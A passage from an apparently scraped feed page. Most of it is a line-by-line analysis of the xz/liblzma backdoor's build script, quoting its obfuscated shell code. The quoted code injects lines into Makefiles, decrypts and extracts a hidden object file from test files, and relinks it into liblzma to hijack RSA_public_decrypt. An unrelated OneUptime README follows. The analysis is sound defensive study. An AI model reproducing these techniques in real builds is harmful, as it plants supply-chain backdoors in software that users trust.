if ! grep -qs "$M" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
L="^all: all-recursive$"
if ! grep -qs "$L" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
if ! grep -qs "$m" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
if ! grep -qs "$u" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Check that <code>liblzma/Makefile</code> contains all the lines that will be used as anchor points later for inserting new text into the Makefile.
</p><pre>if ! grep -qs "$O" libtool &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
<code>$O</code> was set at the very start of the script. This is checking that the libtool file, presumably generated during the build process, configures the compiler for a PIC (position independent code) build.
</p><pre>eval $zrKcTy
b="am__test = $U"
</pre>


<p>
<code>$U</code> was also set at the start of the script: <code>U="bad-3-corrupt_lzma2.xz"</code>. Real work is starting!
</p><pre>sed -i "/$j/i$b" src/liblzma/Makefile || true
</pre>


<p>
<code>sed -i</code> runs an in-place modification of the input file, in this case <code>liblzma/Makefile</code>. Specifically, find the <code>ACLOCAL_M4</code> line we grepped for earlier (<code>/$j/</code>) and insert the <code>am__test</code> setting from <code>$b</code> (<code>i$b</code>).
</p><pre>d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
b="am__strip_prefix = $d"
sed -i "/$w/i$b" src/liblzma/Makefile || true
</pre>


<p>
Shell quoting inside a quoted string inside a Makefile really is a something special. This is escaping the backslashes in the tr command enough times that it will work to insert them into the Makefile after the <code>am__install_max</code> line (<code>$w</code>).
</p><pre>b="am__dist_setup = \$(am__strip_prefix) | xz -d 2&gt;/dev/null | \$(SHELL)"
sed -i "/$E/i$b" src/liblzma/Makefile || true
b="\$(top_srcdir)/tests/files/\$(am__test)"
s="am__test_dir=$b"
sed -i "/$Q/i$s" src/liblzma/Makefile || true
</pre>


<p>
More added lines. It’s worth stopping for a moment to look at what’s happened so far. The script has added these lines to <code>src/liblzma/Makefile</code>:
</p><pre>am__test = bad-3-corrupt_lzma2.xz
am__strip_prefix = tr "\\t \\-_" " \\t_\\-"
am__dist_setup = $(am_strip_prefix) | xz -d 2&gt;/dev/null | $(SHELL)
am__test_dir = $(top_srcdir)/tests/files/$(am__test)
</pre>


<p>
<br>
These look plausible but fall apart under closer examination: for example, <code>am__test_dir</code> is a file, not a directory. The goal here seems to be that after <code>configure</code> has run, the generated <code>Makefile</code> still looks plausibly inscrutable. And the lines have been added in scattered places throughout the <code>Makefile</code>; no one will see them all next to each other like in this display. Back to the script:
</p><pre>h="-Wl,--sort-section=name,-X"
if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" &gt; /dev/null 2&gt;&amp;1;then
h=$h",-z,now"
fi
j="liblzma_la_LDFLAGS += $h"
sed -i "/$L/i$j" src/liblzma/Makefile || true
</pre>


<p>
<br>
Add <code>liblzma_la_LDFLAGS += -Wl,--sort-section=name,-X</code> to the Makefile. If the <code>LDFLAGS</code> do not already say <code>-z,now</code> or <code>-Wl,now</code>, add <code>-z,now</code>.

</p><p>
The “<code>-Wl,now</code>” forces <code>LD_BIND_NOW</code> behavior, in which the dynamic loader resolves all symbols at program startup time. One reason this is normally done is for security: it makes sure that the global offset table and procedure linkage tables can be marked read-only early in process startup, so that buffer overflows or write-after-free bugs cannot target those tables. However, it also has the effect of running GNU indirect function (ifunc) resolvers at startup during that resolution process, and the backdoor arranges to be called from one of those. This early invocation of the backdoor setup lets it run while the tables are still writable, allowing the backdoor to replace the entry for <code>RSA_public_decrypt</code> with its own version. But we are getting ahead of ourselves. Back to the script:
</p><pre>sed -i "s/$O/$C/g" libtool || true
</pre>


<p>
We checked earlier that the libtool file said <code>pic_flag=" -fPIC -DPIC"</code>. The sed command changes it to read <code>pic_flag=" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"</code>.

</p><p>
It is not clear why these additional flags are important, but in general they disable linker optimizations that could plausibly get in the way of subterfuge.
</p><pre>k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
sed -i "s/$u/$k/" src/liblzma/Makefile || true
l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
    export top_srcdir='\$(top_srcdir)'; \\\\\n\
    export CC='\$(CC)'; \\\\\n\
    export DEFS='\$(DEFS)'; \\\\\n\
    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
    export INCLUDES='\$(INCLUDES)'; \\\\\n\
    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
    export CFLAGS='\$(CFLAGS)'; \\\\\n\
    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
    export libdir='\$(libdir)'; \\\\\n\
    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
sed rpath \$(am__test_dir) | \$(am__dist_setup) &gt;/dev/null 2&gt;&amp;1";
sed -i "/$m/i$l" src/liblzma/Makefile || true
eval $zrKcHD
</pre>


<p>
Shell quoting continues to be trippy, but we’ve reached the final change. This adds the line
</p><pre>AM_V_CCLD = @echo -n $(LTDEPS); $(am__v_CCLD_$(V))
</pre>


<p>
to one place in the Makefile, and then adds a long script that sets up some variables, entirely as misdirection, that ends with
</p><pre>sed rpath $(am__test_dir) | $(am__dist_setup) &gt;/dev/null 2&gt;&amp;1
</pre>


<p>
The <code>sed rpath</code> command is just as much an obfuscated <code>cat</code> as <code>sed "r\n"</code> was, but <code>-rpath</code> is a very common linker flag, so at first glance you might not notice it’s next to the wrong command. Recalling the <code>am__test</code> and related lines added above, this pipeline ends up being equivalent to:
</p><pre>cat ./tests/files/bad-3-corrupt_lzma2.xz |
tr "\t \-_" " \t_\-" |
xz -d |
/bin/sh
</pre>


<p>
Our old friend! We know what this does, though. It runs the very script we are currently reading in this post. <a href="https://research.swtch.com/zip">How recursive!</a>
<a href="#make"></a></p><h2 id="make"><a href="#make">Make</a></h2>


<p>
Instead of running during <code>configure</code> in the tarball root directory, let's mentally re-execute the script as it would run during <code>make</code> in the <code>liblzma</code> directory. In that context, the variables at the top have been set, but all the editing we just considered was skipped over by “if #1” not finding <code>./config.status</code>. Now let's keep executing the script.
</p><pre>fi
</pre>


<p>
That <code>fi</code> closes “if #2”, which checked for a Debian or RPM build. The upcoming <code>elif</code> continues “if #1”, which checked for config.status, meaning now we are executing the part of the script that matters when run during <code>make</code> in the <code>liblzma</code> directory:
</p><pre>elif (test -f .libs/liblzma_la-crc64_fast.o) &amp;&amp; (test -f .libs/liblzma_la-crc32_fast.o); then
</pre>


<p>
If we see the built objects for the crc code, we are running as part of <code>make</code>. Run the following code.
</p><pre># Entirely new in 5.6.1
vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2&gt;/dev/null`
if test "x$vs" != "x" &gt; /dev/null 2&gt;&amp;1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" &gt; /dev/null 2&gt;&amp;1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2&gt;/dev/null`
if test "x$ve" != "x" &gt; /dev/null 2&gt;&amp;1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" &gt; /dev/null 2&gt;&amp;1;then
[ ! "x$f2" = "x$f1" ] &amp;&amp; exit 0
[ ! -f $f1 ] &amp;&amp; exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} |
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
    xz -F raw --lzma2 -dc`
fi
fi
fi
fi
</pre>


<p>
We start this section with another extension hook. This time the magic strings are <code>'jV!.^%'</code> and <code>'%.R.1Z'</code>. As before, there are no test files with these strings. This was for future extensibility.

</p><p>
On to the code shared with 5.6.0:
</p><pre>eval $zrKcKQ
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
exit 0
fi
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
exit 0
fi
if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
</pre>


<p>
Check that the ifunc-enabled CRC source files look right. Interestingly, Lasse Collin renamed <code>crc_clmul.c</code> to <code>crc_x86_clmul.h</code> <a href="https://git.tukaani.org/?p=xz.git;a=commit;h=419f55f9dfc2df8792902b8953d50690121afeea">on 2024-01-11</a>. One has to assume that the person or team behind “Jia Tan” had been working on all this code well before then and that the first version checked <code>crc_clmul.c</code>. They were probably very annoyed when Lasse Collin accidentally broke their in-development backdoor by cleaning up the file names!
</p><pre>if ! grep -qs "$C" ../../libtool; then
exit 0
fi
if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Check that the build configuration has the extra flags we added before.
</p><pre>if echo $liblzma_la_LINK | grep -qs -e "lazy" &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Check that no one has added <code>lazy</code> to the linker options, which might override the <code>-Wl,now</code>. (This code really needs to run before the tables it patches get marked read-only!)
</p><pre>N=0
W=0
Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
eval $zrKcjv
if test -z "$Y"; then
N=0
W=88664
else
N=88664
W=0
fi
</pre>


<p>
This is selecting between two different offset values depending on the content of <code>gettext.m4</code>. The distributed xz tarballs do not contain that string in <code>gettext.m4</code> (it does appear in <code>build-to-host.m4</code>), so the <code>grep</code> finds nothing, <code>$Y</code> is the empty string, and the true case of the <code>if</code> executes: <code>N=0</code> and <code>W=88792</code>.
</p><pre>xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" |
</pre>


<p>
I inserted a line break here. Remember the “corrupt” test file script set <code>i</code> to the large head pipeline? It’s still set here, being used inside the script extracted from that pipeline. Before, the pipeline extracted 33,707 bytes and then we used the final 31,233 bytes. Now we are using the entire thing, which probably means just the prefix that we skipped before. The sed command is inserting a newline after every byte of that output, setting up for piping into the remainder of the command line:
</p><pre>LC_ALL=C awk '
BEGIN{
    FS="\n";RS="\n";ORS="";m=256;
    for(i=0;i&lt;m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}
    i=0;j=0;for(l=0;l&lt;8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}
}
{
    v=t["x" (NF&lt;1?RS:$1)];
    i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];
    printf "%c",(v+k)%m
}' |
</pre>


<p>
I inserted another line break here. What is this? <a href="https://twitter.com/nugxperience/status/1773906926503591970">@nugxperience on Twitter recognized it</a> as an RC4-like decryption function, implemented in awk! Apparently the <code>tr</code>-based substitution cipher wasn’t secure enough for this step. This is the 5.6.1 version; the 5.6.0 version is the same except that the first loop counts to 4096 instead of 8192.

</p><p>
Back to the script:
</p><pre>xz -dc --single-stream | ((head -c +$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c +$W) &gt; liblzma_la-crc64-fast.o || true
</pre>


<p>
We finally made it to the end of this long line. The decrypted output is piped through xz to decompress it; the <code>--single-stream</code> flag says to stop at the end of the first xz EOF marker instead of looking for additional files on standard input. This avoids reading the section of the input that we extracted with the <code>tail</code> command before. Then the decompressed data is piped through a <code>head</code> pair that extracts either the full 88,792 byte input or zero bytes, depending on <code>gettext.m4</code> from before, and writes it to <code>liblzma_la-crc64-fast.o</code>. In our build, we are taking the full input.
</p><pre>if ! test -f liblzma_la-crc64-fast.o; then
exit 0
fi
</pre>


<p>
If all that failed, stop quietly.
</p><pre>cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
</pre>


<p>
Wait what? Oh! Notice the two different file names <code>crc64_fast</code> versus <code>crc64-fast</code>. And neither of these is the one we just extracted. These are in <code>.libs/</code>, and the one we extracted is in the current directory. This is backing up the real file (the underscored one) into a file with a very similar name (the hyphenated one).
</p><pre>V='#endif\n#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp;
    defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp;
    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\n
    extern int _get_cpuid(int, void*, void*, void*, void*, void*);\n
    static inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4];
    success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(0))-16);
    const uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19);
    return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask; }\n
    #else\n
    #define _is_arch_extension_supported is_arch_extension_supported'
</pre>


<p>
This string <code>$V</code> begins with “<code>#endif</code>”, which is never a good sign. Let’s move on for now, but we’ll take a closer look at that text shortly.
</p><pre>eval $yosA
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2&gt;/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
    $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2&gt;/dev/null; then
</pre>


<p>
This <code>if</code> statement is running a pipeline of sed commands piped into <code>$CC</code> with the arguments <code>liblzma_la-crc64-fast.o</code> (adding that object as an input to the compiler) and <code>-x</code> <code>c</code> <code>-</code> (compile a C program from standard input). That is, it rebuilds an edited copy of <code>crc64_fast.c</code> (a real xz source file) and merges the extracted malicious <code>.o</code> file into the resulting object, overwriting the underscored real object file that would have been built originally for <code>crc64_fast.c</code>. The <code>sed</code> <code>1i</code> tells the compiler the file name to record in debug info, since the compiler is reading standard input—very tidy! But what are the edits?

</p><p>
The file starts out looking like: 
</p><pre>...
#if defined(CRC_X86_CLMUL)
#   define BUILDING_CRC64_CLMUL
#   include "crc_x86_clmul.h"
#endif
...
static crc64_func_type
crc64_resolve(void)
{
    return is_arch_extension_supported()
            ? &amp;crc64_arch_optimized : &amp;crc64_generic;
}
</pre>


<p>
The sed commands add an <code>_</code> prefix to the name of the function in the return condition, and then add <code>$V</code> after the <code>include</code> line, producing (with reformatting of the C code):
</p><pre># 0 "path/to/src/liblzma/check/crc64_fast.c"
...
#if defined(CRC_X86_CLMUL)
#   define BUILDING_CRC64_CLMUL
#   include "crc_x86_clmul.h"
#endif

#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; \
    defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; \
    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))

extern int _get_cpuid(int, void*, void*, void*, void*, void*);

static inline bool _is_arch_extension_supported(void) {
    int success = 1;
    uint32_t r[4];
    success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(0))-16);
    const uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19);
    return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask;
}

#else
#define _is_arch_extension_supported is_arch_extension_supported
#endif
...
static crc64_func_type
crc64_resolve(void)
{
    return _is_arch_extension_supported()
            ? &amp;crc64_arch_optimized : &amp;crc64_generic;
}
</pre>


<p>
That is, the crc64_resolve function, which is the ifunc resolver that gets run early in dynamic loading, before the GOT and PLT have been marked read-only, is now calling the newly inserted <code>_is_arch_extension_supported</code>, which calls <code>_get_cpuid</code>. This still looks like plausible code, since this is pretty similar to <a href="https://git.tukaani.org/?p=xz.git;a=blob;f=src/liblzma/check/crc_x86_clmul.h;h=ae66ca9f8c710fd84cd8b0e6e52e7bbfb7df8c0f;hb=2d7d862e3ffa8cec4fd3fdffcd84e984a17aa429#l388">the real is_arch_extension_supported</a>. But <code>_get_cpuid</code> is provided by the backdoor .o, and it does a lot more before returning the cpuid information. In particular it rewrites the GOT and PLT to hijack calls to RSA_public_decrypt.

</p><p>
But let’s get back to the shell script, which is still running from inside <code>src/liblzma/Makefile</code> and just successfully inserted the backdoor into <code>.libs/liblzma_la-crc64_fast.o</code>. We are now in the <code>if</code> compiler success case:
</p><pre>cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
eval $BPep
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
sed "/include \"crc32_arm64.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2&gt;/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
    $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
</pre>


<p>
This does the same thing for <code>crc32_fast.c</code>, except it doesn’t add the backdoored object code. We don’t want two copies of that in the build. It is unclear why the script bothers to intercept both the crc32 and crc64 ifuncs; either one should have sufficed. Perhaps they wanted the dispatch code for both to look similar in a debugger. Now we’re in the doubly nested <code>if</code> compiler success case:
</p><pre>eval $RgYB
if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
</pre>


<p>
If we can relink the .la file, then...
</p><pre>if test ! -f .libs/liblzma.so; then
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
</pre>


<p>
<br>
If the relink succeeded but didn’t write the file, assume it failed and restore the backups.
</p><pre>rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
</pre>


<p>
No matter what, remove the libraries. (The <code>Makefile</code> link step is presumably going to happen next and recreate them.)
</p><pre>else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
</pre>


<p>
This is the <code>else</code> for the link failing. Restore from backups.
</p><pre>rm -f .libs/liblzma_la-crc32-fast.o || true
rm -f .libs/liblzma_la-crc64-fast.o || true
</pre>


<p>
Now we are in the inner compiler success case. Delete backups.
</p><pre>else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
</pre>


<p>
This is the else for the crc32 compilation failing. Restore from backups.
</p><pre>else
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
</pre>


<p>
This is the else for the crc64 compilation failing. Restore from backup. (This is not the cleanest shell script in the world!)
</p><pre>rm -f liblzma_la-crc64-fast.o || true
</pre>


<p>
Now we are at the end of the Makefile section of the script. Delete the backup.
</p><pre>fi
eval $DHLd
$
</pre>


<p>
Close the “<code>elif</code> we’re in a Makefile”, one more extension point/debug print, and we’re done!
The script has injected the object file into the objects built during <code>make</code>, leaving no trace behind.
      </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: OneUptime – open-source Datadog Alternative (156 pts)]]></title>
            <link>https://github.com/OneUptime/oneuptime</link>
            <guid>39903471</guid>
            <pubDate>Tue, 02 Apr 2024 08:22:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/OneUptime/oneuptime">https://github.com/OneUptime/oneuptime</a>, See on <a href="https://news.ycombinator.com/item?id=39903471">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text">
<div dir="auto"><h2 tabindex="-1" dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/OneUptime/oneuptime/master/App/FeatureSet/Home/Static/img/OneUptimePNG/7.png"><img alt="oneuptime logo" width="50%" src="https://raw.githubusercontent.com/OneUptime/oneuptime/master/App/FeatureSet/Home/Static/img/OneUptimePNG/7.png"></a></h2><a id="" aria-label="Permalink: " href="#"></a></div>

<p dir="auto"><h3 tabindex="-1" dir="auto">OneUptime: The Complete Open-Source Observability Platform</h3><a id="user-content-oneuptime-the-complete-open-source-observability-platform" aria-label="Permalink: OneUptime: The Complete Open-Source Observability Platform" href="#oneuptime-the-complete-open-source-observability-platform"></a></p>
<p dir="auto">OneUptime is a comprehensive solution for monitoring and managing your online services. Whether you need to check the availability of your website, dashboard, API, or any other online resource, OneUptime can alert your team when downtime happens and keep your customers informed with a status page. OneUptime also helps you handle incidents, set up on-call rotations, run tests, secure your services, analyze logs, track performance, and debug errors.</p>
<p dir="auto">OneUptime replaces multiple tools with one integrated platform:</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Uptime Monitoring</h4><a id="user-content-uptime-monitoring" aria-label="Permalink: Uptime Monitoring" href="#uptime-monitoring"></a></p>
<p dir="auto">Monitor the availability and response time of your online services from multiple locations around the world. Get notified via email, SMS, Slack, or other channels when something goes wrong. Replace tools like Pingdom.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/monitoring.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/monitoring.png?raw=true" alt="Monitoring"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Status Pages</h4><a id="user-content-status-pages" aria-label="Permalink: Status Pages" href="#status-pages"></a></p>
<p dir="auto">Communicate with your customers and stakeholders during downtime or maintenance. Create a custom-branded status page that shows the current status and history of your services. Replace tools like StatusPage.io.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/statuspages.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/statuspages.png?raw=true" alt="Status Pages"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Incident Management</h4><a id="user-content-incident-management" aria-label="Permalink: Incident Management" href="#incident-management"></a></p>
<p dir="auto">Manage incidents from start to finish with a collaborative workflow. Create incident reports, assign tasks, update stakeholders, and document resolutions. Replace tools like Incident.io.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/incident-management.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/incident-management.png?raw=true" alt="Incident Management"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">On Call and Alerts</h4><a id="user-content-on-call-and-alerts" aria-label="Permalink: On Call and Alerts" href="#on-call-and-alerts"></a></p>
<p dir="auto">Schedule on-call shifts for your team and define escalation policies. Ensure that the right person is notified at the right time when an incident occurs. Replace tools like PagerDuty.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/on-call.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/on-call.png?raw=true" alt="On Call and Alerts"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Logs Management</h4><a id="user-content-logs-management" aria-label="Permalink: Logs Management" href="#logs-management"></a></p>
<p dir="auto">Collect, store, and analyze logs from your online services. Search, filter, and visualize log data to gain insights and troubleshoot issues. Replace tools like Loggly.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/logs-management.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/logs-management.png?raw=true" alt="Logs Management"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Workflows</h4><a id="user-content-workflows" aria-label="Permalink: Workflows" href="#workflows"></a></p>
<p dir="auto">Integrate OneUptime with your existing tools and automate your workflows. Integrate with tools like Slack, Jira, GitHub, and 5000+ more.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/workflows.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/workflows.png?raw=true" alt="Workflows"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Application Performance Monitoring</h4><a id="user-content-application-performance-monitoring" aria-label="Permalink: Application Performance Monitoring" href="#application-performance-monitoring"></a></p>
<p dir="auto">Measure and optimize the performance of your online apps and services. Track key metrics such as traces, response time, throughput, error rate, and user satisfaction. Replace tools like NewRelic and DataDog.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/apm.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/apm.png?raw=true" alt="APM"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Coming Soon</h4><a id="user-content-coming-soon" aria-label="Permalink: Coming Soon" href="#coming-soon"></a></p>
<ul dir="auto">
<li><strong>Error Tracking</strong>: Detect and diagnose errors in your online services. Get detailed error reports with stack traces, context, and user feedback. Replace tools like Sentry.</li>
<li><strong>Reliability Autopilot</strong>: Scan your code and fix performance issues and errors automatically. Get recommendations for improving the reliability of your online services.</li>
</ul>
<p dir="auto">All under one platform.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Get Started for Free with OneUptime Cloud</h2><a id="user-content-get-started-for-free-with-oneuptime-cloud" aria-label="Permalink: Get Started for Free with OneUptime Cloud" href="#get-started-for-free-with-oneuptime-cloud"></a></p>
<p dir="auto">OneUptime Cloud is the easiest and fastest way to monitor your website uptime and performance. You can sign up for free to <a href="https://oneuptime.com/" rel="nofollow">OneUptime Cloud</a> and enjoy the full benefits of OneUptime without any installation or maintenance hassle.</p>
<p dir="auto">By using OneUptime Cloud, you also support the development of OneUptime open source project, which is a powerful and flexible tool for website monitoring. You can find more information about OneUptime open source project on <a href="##Philosophy">GitHub</a>. The code of OneUptime is completely open source, which means you can access, modify, and distribute it freely. You can also contribute to the project by reporting issues, suggesting features, or submitting pull requests.</p>
<p dir="auto">If you need advanced features, such as API Access, Advances Workflows, or Advanced Access Control, you can upgrade to a paid plan anytime. You can compare the different plans and pricing on <a href="https://oneuptime.com/pricing" rel="nofollow">OneUptime Pricing</a> page.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<ul dir="auto">
<li><a href="https://artifacthub.io/packages/helm/oneuptime/oneuptime" rel="nofollow">Install on Kubernetes with Helm</a> (recommended for production)</li>
<li><a href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Docs/Content/installation/docker-compose.md">Install with Docker Compose</a> (hobby install, not recommended for production)</li>
<li><a href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Docs/Content/installation/local-development.md">Install for Local Development</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Philosophy</h2><a id="user-content-philosophy" aria-label="Permalink: Philosophy" href="#philosophy"></a></p>
<p dir="auto">Our mission is to reduce downtime and increase the number of successful products in the world. To do that, we built a platform that helps you understand causes of the downtime, incidents and help reduce toil. Our product is open-source, free and available for everyone to use.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">We &lt;3 contributions big and small. In priority order (although everything is appreciated) with the most helpful first:</p>
<ul dir="auto">
<li>Give us feedback in our <a href="https://oneuptimesupport.slack.com/join/shared_invite/zt-1kavkds2f-gegm_wePorvwvM3M_SaoCQ#/shared-invite/email" rel="nofollow">Customer Slack community</a></li>
<li>Talk to developers in our <a href="https://join.slack.com/t/oneuptimedev/shared_invite/zt-17r8o7gkz-nITGan_PS9JYJV6WMm_TsQ" rel="nofollow">Developer Slack community</a></li>
<li>Write tests for some of our codebase. <a href="https://github.com/OneUptime/oneuptime/issues?q=is%3Aopen+is%3Aissue+label%3A%22write+tests%22">See issues here</a></li>
<li>Work on any issue you like. <a href="https://github.com/OneUptime/oneuptime/issues">See issues here</a></li>
<li>Open new issues and create new feature requests that you would like to see. <a href="https://github.com/OneUptime/oneuptime/issues">Open issues here</a></li>
</ul>
